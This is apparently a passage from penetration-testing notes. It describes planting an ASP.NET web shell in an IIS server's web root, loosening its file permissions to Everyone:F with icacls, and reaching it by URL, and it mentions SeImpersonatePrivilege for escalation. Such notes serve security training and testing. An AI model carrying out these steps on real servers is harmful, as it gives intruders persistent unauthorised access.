### Web Shells
- IIS runs with `iss apppool\defaultapppool`, this is an unprivileged user, but it has `SeImpersonatePrivilege`.
- ASP.NET shell can be placed in the web root directory, `C:\inetpub\wwwroot`.
```powershell
move shell.aspx C:\inetpub\wwwroot\
```
- It might be that the `iis apppool\defaultapppool` doesn't have the permission to read the file.
- Permission of the file can be changed using `icacls`
```powershell
icacls.exe shell.aspx /grant Everyone:F
```
- The web shell can be located at http://server.com/shell.aspx.
### MSSQL